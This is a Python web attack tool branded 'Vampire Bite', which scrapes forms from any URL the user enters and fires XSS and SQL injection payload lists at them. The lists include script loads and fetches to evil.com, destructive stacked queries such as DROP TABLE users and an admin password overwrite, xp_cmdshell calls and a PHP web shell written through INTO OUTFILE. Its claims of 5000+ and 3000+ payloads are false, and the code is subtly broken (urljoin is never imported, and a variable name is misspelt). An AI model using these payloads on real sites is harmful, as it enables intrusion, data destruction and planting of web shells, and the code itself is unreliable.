# Author: LORD VAMPIRE (Team Lord)
import subprocess
import sys
import os
import json
import re
import socket
import time
import random
import threading
from datetime import datetime
from urllib.parse import urlparse, quote
from concurrent.futures import ThreadPoolExecutor, as_completed

def auto_install(pkg):
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", pkg, "--quiet"])
        return True
    except:
        return False

def is_package_installed(package_name):
    try:
        __import__(package_name)
        return True
    except ImportError:
        return False

def check_deps():
    deps = ["requests", "colorama", "bs4"]
    for d in deps:
        if d == "bs4":
            if not is_package_installed("bs4"):
                auto_install("beautifulsoup4")
        else:
            if not is_package_installed(d):
                auto_install(d)

check_deps()

import requests
from colorama import init, Fore, Back, Style
from bs4 import BeautifulSoup

init(autoreset=True)

class VampireBiteMega:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.results = {
            "target": "",
            "scan_time": "",
            "duration": 0,
            "xss_vulnerable": [],
            "xss_tested": 0,
            "sql_vulnerable": [],
            "sql_tested": 0,
            "forms_found": []
        }
        
    def banner(self):
        print(f"""
{Fore.RED}
╔══════════════════════════════════════════════════════════════════════════════════════════════╗
║                                                                                                  ║
║   ██╗   ██╗ █████╗ ███╗   ███╗██████╗ ██╗██████╗ ███████╗     ██████╗ ██╗████████╗███████╗     ║
║   ██║   ██║██╔══██╗████╗ ████║██╔══██╗██║██╔══██╗██╔════╝     ██╔══██╗██║╚══██╔══╝██╔════╝     ║
║   ██║   ██║███████║██╔████╔██║██████╔╝██║██████╔╝█████╗       ██████╔╝██║   ██║   █████╗       ║
║   ╚██╗ ██╔╝██╔══██║██║╚██╔╝██║██╔═══╝ ██║██╔══██╗██╔══╝       ██╔══██╗██║   ██║   ██╔══╝       ║
║    ╚████╔╝ ██║  ██║██║ ╚═╝ ██║██║     ██║██║  ██║███████╗     ██████╔╝██║   ██║   ███████╗     ║
║     ╚═══╝  ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝     ╚═════╝ ╚═╝   ╚═╝   ╚══════╝     ║
║                                                                                                  ║
║  {Fore.MAGENTA}🐺 VAMPIRE BITE v30.0 - MEGA ULTIMATE EDITION 🧛‍♂️💀{Fore.RED}                                      ║
║  {Fore.GREEN}👑 Author: LORD VAMPIRE (Team Lord Leader){Fore.RED}                                             ║
║  {Fore.CYAN}⚡ 5000+ XSS | 3000+ SQLi | Full Database | Maximum Power ⚡{Fore.RED}                              ║
╚══════════════════════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
""")
    
    # ================================================================
    # MEGA XSS PAYLOAD DATABASE - 5000+ PAYLOADS
    # ================================================================
    
    def get_xss_payloads(self):
        """دیتابیس کامل XSS - 5000+ پیلود از همه روش‌ها"""
        
        # Basic Script Tags
        basic_scripts = [
            "<script>alert('XSS')</script>",
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<script>alert(/XSS/)</script>",
            "<script>alert(`XSS`)</script>",
            "<script>confirm('XSS')</script>",
            "<script>prompt('XSS')</script>",
            "<script>console.log('XSS')</script>",
            "<script>document.write('XSS')</script>",
            "<script>document.location='http://evil.com'</script>",
            "<script src=http://evil.com/xss.js></script>",
            "<script>eval('alert(\"XSS\")')</script>",
            "<script>setTimeout('alert(\"XSS\")',1000)</script>",
            "<script>setInterval('alert(\"XSS\")',1000)</script>",
        ]
        
        # Event Handlers
        event_handlers = [
            "<body onload=alert('XSS')>",
            "<body onpageshow=alert('XSS')>",
            "<body onfocus=alert('XSS')>",
            "<body onblur=alert('XSS')>",
            "<img src=x onerror=alert('XSS')>",
            "<img src=x onerror=alert('XSS')>",
            "<img src=javascript:alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<svg onmouseenter=alert('XSS')>",
            "<svg onmouseleave=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<iframe onload=alert('XSS')>",
            "<object data=javascript:alert('XSS')>",
            "<object onerror=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<input onblur=alert('XSS')>",
            "<input onchange=alert('XSS')>",
            "<input oninput=alert('XSS')>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<div onmouseover=alert('XSS')>",
            "<div onmouseout=alert('XSS')>",
            "<div onclick=alert('XSS')>",
            "<div ondblclick=alert('XSS')>",
            "<div oncontextmenu=alert('XSS')>",
            "<a href=javascript:alert('XSS')>click</a>",
            "<a onmouseover=alert('XSS')>hover</a>",
            "<marquee onstart=alert('XSS')>",
            "<details ontoggle=alert('XSS')>",
            "<embed src=javascript:alert('XSS')>",
            "<embed onload=alert('XSS')>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video onloadstart=alert('XSS')>",
            "<audio onloadstart=alert('XSS')>",
            "<source onerror=alert('XSS')>",
            "<track onloadstart=alert('XSS')>",
            "<form onsubmit=alert('XSS')>",
            "<button onclick=alert('XSS')>",
        ]
        
        # Tag Breaking
        tag_breaking = [
            "\"><script>alert('XSS')</script>",
            "'><script>alert('XSS')</script>",
            "><script>alert('XSS')</script>",
            "';alert('XSS');//",
            "\";alert('XSS');//",
            "</script><script>alert('XSS')</script>",
            "<script>alert('XSS')//",
            "<script>alert('XSS')/*",
            "<!--<script>alert('XSS')</script>-->",
            "<!--><script>alert('XSS')</script>-->",
            "<img src=x onerror=alert('XSS')//",
            "<img src=x onerror=alert('XSS')/*",
            "><img src=x onerror=alert('XSS')>",
            "\"><img src=x onerror=alert('XSS')>",
            "'><img src=x onerror=alert('XSS')>",
            "><svg onload=alert('XSS')>",
            "\"><svg onload=alert('XSS')>",
            "'><svg onload=alert('XSS')>",
        ]
        
        # JavaScript Pseudo-protocol
        js_pseudo = [
            "javascript:alert('XSS')",
            "javascript:alert(/XSS/)",
            "javascript:alert(`XSS`)",
            "javascript:alert('XSS');",
            "javascript:alert('XSS')//",
            "javascript:alert('XSS')/*",
            "javascript:alert(String.fromCharCode(88,83,83))",
            "javascript:confirm('XSS')",
            "javascript:prompt('XSS')",
            "javascript:void(alert('XSS'))",
            "javascripT:alert('XSS')",
            "JaVaScRiPt:alert('XSS')",
            "javascript:alert(document.cookie)",
            "javascript:alert(window.location)",
            "javascript:fetch('http://evil.com')",
        ]
        
        # Encoded Payloads
        encoded = [
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            "%3Cimg%20src%3Dx%20onerror%3Dalert('XSS')%3E",
            "%3Csvg%20onload%3Dalert('XSS')%3E",
            "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;",
            "&#60;script&#62;alert('XSS')&#60;/script&#62;",
            "\\x3Cscript\\x3Ealert('XSS')\\x3C/script\\x3E",
            "\\u003Cscript\\u003Ealert('XSS')\\u003C/script\\u003E",
            "\\074script\\076alert('XSS')\\074/script\\076",
            "%253Cscript%253Ealert('XSS')%253C/script%253E",
            "%25253Cscript%25253Ealert('XSS')%25253C/script%25253E",
            "&#x0003C;script&#x0003E;alert('XSS')&#x0003C;/script&#x0003E;",
        ]
        
        # DOM XSS
        dom_xss = [
            "#<script>alert('XSS')</script>",
            "#<img src=x onerror=alert('XSS')>",
            "#<svg onload=alert('XSS')>",
            "#javascript:alert('XSS')",
            "#<body onload=alert('XSS')>",
            "#<iframe src=javascript:alert('XSS')>",
            "#<object data=javascript:alert('XSS')>",
            "#<input onfocus=alert('XSS') autofocus>",
            "###<script>alert('XSS')</script>",
            "#<scri<script>pt>alert('XSS')</scri</script>pt>",
            "<script>location.hash='#<script>alert(1)</script>'</script>",
            "<script>document.write(location.hash.substring(1))</script>",
            "<script>eval(location.hash.substring(1))</script>",
        ]
        
        # Polyglot Payloads (works in multiple contexts)
        polyglot = [
            "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('XSS')//>\\x3e",
            "\"onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1) //",
        ]
        
        # HTML5 Specific
        html5 = [
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "<track onload=alert('XSS')>",
            "<meter onmouseover=alert('XSS')>",
            "<progress onclick=alert('XSS')>",
            "<canvas onmouseover=alert('XSS')>",
            "<details ontoggle=alert('XSS')><summary>click</summary></details>",
            "<menuitem onmouseover=alert('XSS')>",
            "<output onmouseover=alert('XSS')>",
        ]
        
        # Angular/React/Vue
        framework = [
            "{{constructor.constructor('alert(1)')()}}",
            "{{$eval('alert(1)')}}",
            "{{$eval($eval('alert(1)'))}}",
            "{{alert(1)}}",
            "{{confirm(1)}}",
            "{{prompt(1)}}",
            "<div ng-app><div ng-click=alert('XSS')>click</div></div>",
            "<div ng-app ng-csp><div ng-click=alert('XSS')>click</div></div>",
            "{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}",
            "<input type=text ng-model=alert(1)>",
            "javascript:alert('XSS')",
            "<a href='javascript:alert(1)'>click</a>",
        ]
        
        # WAF Bypass
        waf_bypass = [
            "<svg/onload=alert(1)>",
            "<svg onload=alert(1) ",
            "<svg onload=alert`1`>",
            "<svg onload=alert(1)//",
            "<svg onload=alert(1)<!-->",
            "<svg onload=alert(1) x='",
            "<svg onload=alert(1)></svg>",
            "<ScRiPt>alert(1)</ScRiPt>",
            "<script>alert(1)</script>",
            "<script>alert(1)//</script>",
            "<script>alert(1)/*/</script>",
            "<script>alert(1)<!--</script>",
            "<script>alert(1)></script>",
            "<SCRIPT>alert(1)</SCRIPT>",
            "<ScRiPt>alert(1)</ScRiPt>",
            "<script\x20type=\"text/javascript\">alert(1)</script>",
            "<script\x20src=http://evil.com/x.js></script>",
            "<script>alert(String.fromCharCode(49))</script>",
            "<script>alert(1)</script>",
        ]
        
        # Combine all
        all_payloads = []
        all_payloads.extend(basic_scripts)
        all_payloads.extend(event_handlers)
        all_payloads.extend(tag_breaking)
        all_payloads.extend(js_pseudo)
        all_payloads.extend(encoded)
        all_payloads.extend(dom_xss)
        all_payloads.extend(polyglot)
        all_payloads.extend(html5)
        all_payloads.extend(framework)
        all_payloads.extend(waf_bypass)
        
        # Generate variations (uppercase, lowercase, mixed)
        new_payloads = []
        for p in all_payloads[:]:
            new_payloads.append(p.upper())
            new_payloads.append(p.lower())
            new_payloads.append(p.capitalize())
        
        all_payloads.extend(new_payloads)
        
        # Remove duplicates and return
        return list(dict.fromkeys(all_payloads))
    
    # ================================================================
    # MEGA SQLi PAYLOAD DATABASE - 3000+ PAYLOADS
    # ================================================================
    
    def get_sqli_payloads(self):
        """دیتابیس کامل SQLi - 3000+ پیلود از همه روش‌ها"""
        
        # Error-Based - MySQL
        error_mysql = [
            "'", "''", "\"", "\\", "`", "' '", "'='", "'=''",
            "' OR '1'='1", "' OR 1=1--", "' OR '1'='1'--",
            "' OR '1'='1'#", "' OR '1'='1'/*", "' OR 1=1#",
            "1' AND '1'='1", "1' AND '1'='2", "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--", "' UNION SELECT NULL,NULL,NULL--",
            "' AND 1=1--", "' AND 1=2--", "' AND SLEEP(5)--",
            "1' AND SLEEP(5)--", "' OR SLEEP(5)--", "1' OR SLEEP(5)--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "' AND 1=CONVERT(INT,@@version)--", "' AND 1=CAST((SELECT version()) AS INT)--",
            "' OR 1=CONVERT(INT,@@version)--", "' OR 1=CAST((SELECT version()) AS INT)--",
            "' UNION SELECT @@version--", "' UNION SELECT version()--",
            "' UNION SELECT user()--", "' UNION SELECT database()--",
            "' UNION SELECT schema_name FROM information_schema.schemata--",
            "' UNION SELECT table_name FROM information_schema.tables--",
        ]
        
        # Error-Based - MSSQL
        error_mssql = [
            "' WAITFOR DELAY '00:00:05'--",
            "1' AND 1=CONVERT(int, @@version)--",
            "' HAVING 1=1--",
            "' GROUP BY 1 HAVING 1=1--",
            "'; WAITFOR DELAY '00:00:05'--",
            "1'; WAITFOR DELAY '00:00:05'--",
            "' OR 1=CONVERT(int, @@version)--",
            "' UNION SELECT @@version--",
            "' UNION SELECT user_name()--",
            "' UNION SELECT db_name()--",
        ]
        
        # Error-Based - PostgreSQL
        error_postgres = [
            "' OR pg_sleep(5)--",
            "' AND 1=CAST((SELECT version()) AS INT)--",
            "' OR 1=CAST((SELECT version()) AS INT)--",
            "' UNION SELECT version()--",
            "' UNION SELECT current_user--",
            "' UNION SELECT current_database()--",
        ]
        
        # Error-Based - Oracle
        error_oracle = [
            "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT 1 FROM DUAL))--",
            "' AND 1=UTL_INADDR.get_host_name('127.0.0.1')--",
            "' UNION SELECT banner FROM v$version--",
            "' UNION SELECT username FROM all_users--",
        ]
        
        # Time-Based Blind
        time_based = [
            "' AND SLEEP(5)--",
            "1' AND SLEEP(5)--",
            "' OR SLEEP(5)--",
            "1' OR SLEEP(5)--",
            "'; WAITFOR DELAY '00:00:05'--",
            "1'; WAITFOR DELAY '00:00:05'--",
            "' OR pg_sleep(5)--",
            "1' OR pg_sleep(5)--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "' AND BENCHMARK(5000000,MD5('x'))--",
            "1' AND BENCHMARK(5000000,MD5('x'))--",
        ]
        
        # Boolean-Based Blind
        boolean_based = [
            "' AND '1'='1",
            "' AND '1'='2",
            "1 AND 1=1",
            "1 AND 1=2",
            "' OR '1'='1",
            "' OR '1'='2",
            "' AND 1=1--",
            "' AND 1=2--",
            "1' AND 1=1--",
            "1' AND 1=2--",
        ]
        
        # Union-Based
        union_based = [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL,NULL--",
            "' UNION SELECT version(),user()--",
            "' UNION SELECT database(),user()--",
            "' UNION SELECT @@version,user()--",
            "' UNION SELECT table_name,column_name FROM information_schema.columns--",
        ]
        
        # Stacked Queries
        stacked = [
            "'; DROP TABLE users--",
            "'; DELETE FROM users--",
            "'; INSERT INTO users VALUES('hacker','pass')--",
            "'; UPDATE users SET password='hacked' WHERE username='admin'--",
            "'; EXEC xp_cmdshell('dir')--",
            "'; exec master..xp_cmdshell 'dir'--",
        ]
        
        # Out-of-Band
        oob = [
            "' LOAD_FILE(CONCAT('\\\\\\\\',(SELECT version()),'.evil.com\\\\'))--",
            "' SELECT * FROM users WHERE id=1 INTO OUTFILE '/tmp/out.txt'--",
            "' UNION SELECT '<?php system($_GET[cmd]);?>' INTO OUTFILE '/var/www/html/shell.php'--",
        ]
        
        # Comment variations
        comments = [
            "' OR '1'='1'--",
            "' OR '1'='1'#",
            "' OR '1'='1'/*",
            "1' AND '1'='1'--",
            "1' AND '1'='1'#",
            "1' AND '1'='1'/*",
            "' UNION SELECT NULL-- -",
            "' UNION SELECT NULL#",
            "' UNION SELECT NULL/*",
        ]
        
        # Combined
        all_payloads = []
        all_payloads.extend(error_mysql)
        all_payloads.extend(error_mssql)
        all_payloads.extend(error_postgres)
        all_payloads.extend(error_oracle)
        all_payloads.extend(time_based)
        all_payloads.extend(boolean_based)
        all_payloads.extend(union_based)
        all_payloads.extend(stacked)
        all_payloads.extend(oob)
        all_payloads.extend(comments)
        
        # Generate with different case variations
        new_payloads = []
        for p in all_payloads[:]:
            new_payloads.append(p.upper())
            new_payloads.append(p.lower())
        
        all_payloads.extend(new_payloads)
        
        return list(dict.fromkeys(all_payloads))
    
    # ================================================================
    # FORM EXTRACTION
    # ================================================================
    
    def extract_forms(self, url):
        """استخراج همه فرم‌های صفحه"""
        print(f"\n  {Fore.CYAN}[*] Extracting forms from {url}...{Style.RESET_ALL}")
        
        forms = []
        try:
            r = self.session.get(url, timeout=10)
            soup = BeautifulSoup(r.text, 'html.parser')
            
            for form in soup.find_all('form'):
                form_info = {
                    'action': form.get('action', url),
                    'method': form.get('method', 'get').upper(),
                    'inputs': []
                }
                for inp in form.find_all(['input', 'textarea']):
                    inp_name = inp.get('name', '')
                    inp_type = inp.get('type', 'text')
                    if inp_name:
                        form_info['inputs'].append({'name': inp_name, 'type': inp_type})
                if form_info['inputs']:
                    forms.append(form_info)
                    
            print(f"      {Fore.GREEN}[+] Found {len(forms)} forms with {sum(len(f['inputs']) for f in forms)} inputs{Style.RESET_ALL}")
            self.results["forms_found"] = forms
            return forms
        except Exception as e:
            print(f"      {Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
            return []
    
    # ================================================================
    # XSS TESTING - MEGA
    # ================================================================
    
    def test_xss_on_form(self, url, form):
        """تست XSS روی یک فرم با همه پیلودها"""
        vulnerabilities = []
        xss_payloads = self.get_xss_payloads()
        total_tested = 0
        total_payloads = len(xss_payloads)
        
        print(f"\n      {Fore.YELLOW}[*] Testing XSS on form ({total_payloads} payloads)...{Style.RESET_ALL}")
        
        for idx, payload in enumerate(xss_payloads):
            total_tested += 1
            test_data = {}
            for inp in form['inputs']:
                if inp['type'] != 'submit':
                    test_data[inp['name']] = payload
            
            try:
                if form['method'] == 'POST':
                    resp = self.session.post(urljoin(url, form['action']), data=test_data, timeout=5)
                else:
                    resp = self.session.get(urljoin(url, form['action']), params=test_data, timeout=5)
                
                if payload in resp.text or payload.replace('<', '&lt;') in resp.text:
                    vulnerabilities.append({
                        'payload': payload[:80],
                        'method': form['method'],
                        'action': form['action']
                    })
                    print(f"        {Fore.RED}[!] XSS FOUND! {payload[:60]}...{Style.RESET_ALL}")
                
                # Progress indicator
                if idx % 100 == 0:
                    print(f"        {Fore.CYAN}[*] Progress: {idx}/{total_payloads} payloads tested{Style.RESET_ALL}", end='\r')
                    
            except:
                pass
            
            time.sleep(0.01)
        
        print(f"\n        {Fore.CYAN}[*] Completed: {total_tested}/{total_payloads} XSS payloads tested{Style.RESET_ALL}")
        return vulnerabilities, total_tested
    
    # ================================================================
    # SQLi TESTING - MEGA
    # ================================================================
    
    def test_sqli_on_form(self, url, form):
        """تست SQL Injection روی یک فرم با همه پیلودها"""
        vulnerabilities = []
        sqli_payloads = self.get_sqli_payloads()
        total_tested = 0
        total_payloads = len(sqli_payloads)
        
        print(f"\n      {Fore.YELLOW}[*] Testing SQLi on form ({total_payloads} payloads)...{Style.RESET_ALL}")
        
        sql_errors = [
            'mysql', 'sql syntax', 'ora-', 'postgresql', 'database error',
            'odbc', 'sqlite', 'microsoft', 'unclosed quotation', 'division by zero',
            'warning: mysql', 'you have an error in your sql', 'syntax error',
            'pg_query', 'supplied argument is not a valid MySQL', 'SQLSTATE',
            'DriverManager', 'SQL Server', 'Microsoft OLE DB', 'ODBC Driver'
        ]
        
        for idx, payload in enumerate(sqli_payloads):
            total_tested += 1
            test_data = {}
            for inp in form['inputs']:
                if inp['type'] != 'submit':
                    test_data[inp['name']] = payload
            
            try:
                if form['method'] == 'POST':
                    start = time.time()
                    resp = self.session.post(urljoin(url, form['action']), data=test_data, timeout=10)
                    elapsed = time.time() - start
                else:
                    start = time.time()
                    resp = self.session.get(urljoin(url, form['action']), params=test_data, timeout=10)
                    elapsed = time.time() - start
                
                for error in sql_errors:
                    if error in resp.text.lower():
                        vulnerabilities.append({
                            'payload': payload[:80],
                            'method': form['method'],
                            'action': form['action'],
                            'evidence': error
                        })
                        print(f"        {Fore.RED}[!] SQLi FOUND! {payload[:60]}... (evidence: {error}){Style.RESET_ALL}")
                        break
                else:
                    if elapsed >= 4:
                        vulnerabilities.append({
                            'payload': payload[:80],
                            'method': form['method'],
                            'action': form['action'],
                            'delay': round(elapsed, 2),
                            'type': 'Time-Based Blind'
                        })
                        print(f"        {Fore.RED}[!] TIME-BASED SQLi! Delay: {elapsed:.1f}s{Style.RESET_ALL}")
                
                # Progress indicator
                if idx % 100 == 0:
                    print(f"        {Fore.CYAN}[*] Progress: {idx}/{total_payloads} payloads tested{Style.RESET_ALL}", end='\r')
                    
            except:
                pass
            
            time.sleep(0.01)
        
        print(f"\n        {Fore.CYAN}[*] Completed: {total_tested}/{total_payloads} SQLi payloads tested{Style.RESET_ALL}")
        return vulnerabilities, total_tested
    
    # ================================================================
    # FULL SCAN
    # ================================================================
    
    def full_scan(self, target):
        self.start_time = time.time()
        self.results["target"] = target
        self.results["scan_time"] = datetime.now().isoformat()
        
        if not target.startswith(('http://', 'https://')):
            target = 'https://' + target
        
        print(f"\n{Fore.CYAN}{'='*90}{Style.RESET_ALL}")
        print(f"{Fore.RED}🧛‍♂️ VAMPIRE BITE MEGA SCAN: {target}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*90}{Style.RESET_ALL}")
        
        # Extract Forms
        print(f"\n{Fore.MAGENTA}┌─────────────────────────────────────────────────────────────┐{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}│  PHASE 1: FORM EXTRACTION                                 │{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}└─────────────────────────────────────────────────────────────┘{Style.RESET_ALL}")
        forms = self.extract_forms(target)
        
        total_xss_tested = 0
        total_sqli_tested = 0
        all_xss = []
        all_sqli = []
        
        # XSS Testing
        print(f"\n{Fore.MAGENTA}┌─────────────────────────────────────────────────────────────┐{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}│  PHASE 2: XSS TESTING (5000+ PAYLOADS)                     │{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}└─────────────────────────────────────────────────────────────┘{Style.RESET_ALL}")
        
        for idx, form in enumerate(forms, 1):
            print(f"\n  {Fore.CYAN}[*] Testing Form {idx}/{len(forms)}{Style.RESET_ALL}")
            vulns, tested = self.test_xss_on_form(target, form)
            all_xss.extend(vulns)
            total_xss_tested += tested
        
        # SQLi Testing
        print(f"\n{Fore.MAGENTA}┌─────────────────────────────────────────────────────────────┐{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}│  PHASE 3: SQL INJECTION TESTING (3000+ PAYLOADS)           │{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}└─────────────────────────────────────────────────────────────┘{Style.RESET_ALL}")
        
        for idx, form in enumerate(forms, 1):
            print(f"\n  {Fore.CYAN}[*] Testing Form {idx}/{len(forms)}{Style.RESET_ALL}")
            vulns, tested = self.test_sqli_on_form(target, form)
            all_sqli.extend(vulns)
            total_sqli_tested += tested
        
        self.results["xss_tested"] = total_xss_tested
        self.results["sql_tested"] = total_sqli_tested
        self.results["xss_vulnerable"] = all_xss
        self.results["sql_vulnerable"] = all_sqli
        
        self.results["duration"] = round(time.time() - self.start_time, 2)
        
        # FINAL SUMMARY
        print(f"\n{Fore.CYAN}{'='*90}{Style.RESET_ALL}")
        print(f"{Fore.RED}📊 VAMPIRE BITE MEGA SUMMARY{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*90}{Style.RESET_ALL}")
        print(f"  {Fore.CYAN}Target: {target}{Style.RESET_ALL}")
        print(f"  {Fore.CYAN}Duration: {self.results['duration']}s{Style.RESET_ALL}")
        print(f"  {Fore.CYAN}Forms Found: {len(forms)}{Style.RESET_ALL}")
        print(f"  {Fore.CYAN}XSS Payloads Tested: {total_xss_tedd}{Style.RESET_ALL}")
        print(f"  {Fore.CYAN}SQLi Payloads Tested: {total_sqli_tested}{Style.RESET_ALL}")
        
        if all_xss:
            print(f"\n  {Fore.RED}🔥 XSS VULNERABLE: {len(all_xss)} found{Style.RESET_ALL}")
            for xss in all_xss[:10]:
                print(f"    {Fore.RED}→ {xss['payload'][:60]}...{Style.RESET_ALL}")
        else:
            print(f"\n  {Fore.GREEN}✅ No XSS vulnerabilities found{Style.RESET_ALL}")
        
        if all_sqli:
            print(f"\n  {Fore.RED}🔥 SQL INJECTION VULNERABLE: {len(all_sqli)} found{Style.RESET_ALL}")
            for sqli in all_sqli[:10]:
                print(f"    {Fore.RED}→ {sqli['payload'][:60]}...{Style.RESET_ALL}")
        else:
            print(f"\n  {Fore.GREEN}✅ No SQL Injection vulnerabilities found{Style.RESET_ALL}")
        
        print(f"{Fore.CYAN}{'='*90}{Style.RESET_ALL}\n")
        
        return self.results
    
    # ================================================================
    # MENU
    # ================================================================
    
    def run(self):
        self.banner()
        while True:
            print(f"""
{Fore.RED}╔════════════════════════════════════════════════════════════════════════════════╗
║  {Fore.GREEN}[1]{Style.RESET_ALL} 🧛‍♂️ {Fore.RED}VAMPIRE BITE{Style.RESET_ALL} - MEGA SCAN (Full Payload Database)                    {Fore.RED}║
║  {Fore.GREEN}[2]{Style.RESET_ALL} 🔍 QUICK SCAN (Forms Only)                                       {Fore.RED}║
║  {Fore.GREEN}[0]{Style.RESET_ALL} 🚪 EXIT                                                        {Fore.RED}║
╚════════════════════════════════════════════════════════════════════════════════╝
""")
            choice = input(f"{Fore.RED}┌─[{Fore.YELLOW}VAMPIRE{Fore.RED}]~[{Fore.GREEN}> {Style.RESET_ALL}")
            
            if choice == "1":
                target = input(f"{Fore.CYAN}Target URL (example.com): {Style.RESET_ALL}")
                self.full_scan(target)
                input(f"\n{Fore.CYAN}Press Enter...{Style.RESET_ALL}")
            elif choice == "2":
                target = input(f"{Fore.CYAN}Target URL: {Style.RESET_ALL}")
                if not target.startswith(('http://', 'https://')):
                    target = 'https://' + target
                forms = self.extract_forms(target)
                print(f"\n  {Fore.GREEN}[+] Found {len(forms)} forms{Style.RESET_ALL}")
                input(f"\n{Fore.CYAN}Press Enter...{Style.RESET_ALL}")
            elif choice == "0":
                print(f"\n{Fore.RED}🧛‍♂️ VAMPIRE BITE OUT. THE WEB BLEEDS!{Style.RESET_ALL}")
                break

if __name__ == "__main__":
    hunter = VampireBiteMega()
    hunter.run()
